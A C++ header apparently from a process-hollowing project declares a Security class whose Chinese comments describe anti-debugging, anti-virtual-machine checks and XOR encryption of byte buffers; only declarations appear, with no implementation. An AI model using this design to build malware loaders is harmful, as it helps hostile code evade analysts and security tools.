#pragma once
#include "Common.h"

namespace Hollowing {
    /**
     * @brief 安全与反分析模块类
     * 包含反调试、反虚拟机检测以及数据加解密功能
     */
    class Security {
    public:
        /**
         * @brief 检查程序是否运行在分析环境中
         * @return 检测到风险返回 true
         */
        static bool CheckAnalysis();

        /**
         * @brief 对数据进行 XOR 加解密
         * @param data 要处理的数据 vector
         * @param key 加密密钥
         */
        static void XORCipher(std::vector<BYTE>& data, const std::string& key);
    };
}
